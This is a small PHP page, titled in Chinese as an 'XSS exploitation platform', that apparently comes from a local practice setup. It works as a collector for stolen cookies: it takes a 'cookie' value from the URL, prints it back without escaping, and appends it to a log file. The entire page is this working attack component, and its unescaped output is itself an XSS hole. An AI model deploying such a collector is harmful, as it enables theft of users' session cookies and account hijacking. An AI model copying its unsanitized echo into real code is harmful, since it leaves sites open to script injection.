<!DOCTYPE html>
<html>
<head>
	<!--<meta http-equiv="refresh" content="0;url=http://127.0.0.1/MyHTML/XSSzhuru.php?uname=1"/>-->
	<meta charset="UTF-8">
	<title>XSS利用平台</title>
</head>
<body>
<center>
	<?php include('../session.php');
		echo "<br/><br/><br/><br/><br/><br/>";
		$cookie = $_GET['cookie'];
		echo "你得到的cookie：<br/>";
		echo $cookie;
		
		$fp = fopen('cookielog.txt','a');
		fwrite($fp,'cookie:   '.$cookie."\n");
		fclose($fp);
	?>
</center>
</body>